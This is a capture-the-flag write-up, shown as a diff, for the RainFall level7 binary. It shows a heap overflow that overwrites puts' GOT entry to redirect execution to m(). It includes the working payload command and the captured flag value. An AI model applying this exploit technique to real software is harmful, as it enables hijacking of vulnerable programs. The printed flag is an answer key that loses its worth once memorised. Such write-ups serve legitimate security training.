@@ -1,0 +1,37 @@
+level7@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
+
+Program:
+    - malloc(8) for str_1 which will contain a value (1) and a pointer to a second bloc
+    - malloc(8) for str_2 which will contain a value (2) and a pointer to a second bloc
+    - strcpy argv[1] into str_1
+    - strcpy argv[2] into str_2
+    - Then reads the flag and stores it on a global (c)
+
+Objective: call m() which print c value
+--> Use the first strcpy to overflow the first buffer and overwrite the
+pointer of the second buffer. We will replace the second buffer''s destination
+address with the address of puts() in the GOT. The second strcpy will then
+write the address of m() directly into the GOT entry of puts().
+
+m address: objdump -t level7
+080484f4 g     F .text	0000002d  m
+puts address: objdump -R level7 
+08049928 R_386_JUMP_SLOT   puts
+
+level7@RainFall:~$ ./level7 $(python -c "print('a'*21)") a
+Segmentation fault (core dumped)
+level7@RainFall:~$ ./level7 $(python -c "print('a'*20)") a
+~~
+--> For argv[1], the 21st char is the offset
+
+Payload: "[20 char (offset)][puts addr]" "[m addr]"
+
+When puts("~~") is called at the end, the program will jump to m() instead.
+
+level7@RainFall:~$ ./level7 $(python -c "print('a'*20 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1761311908
+
+--> Double heap corruption
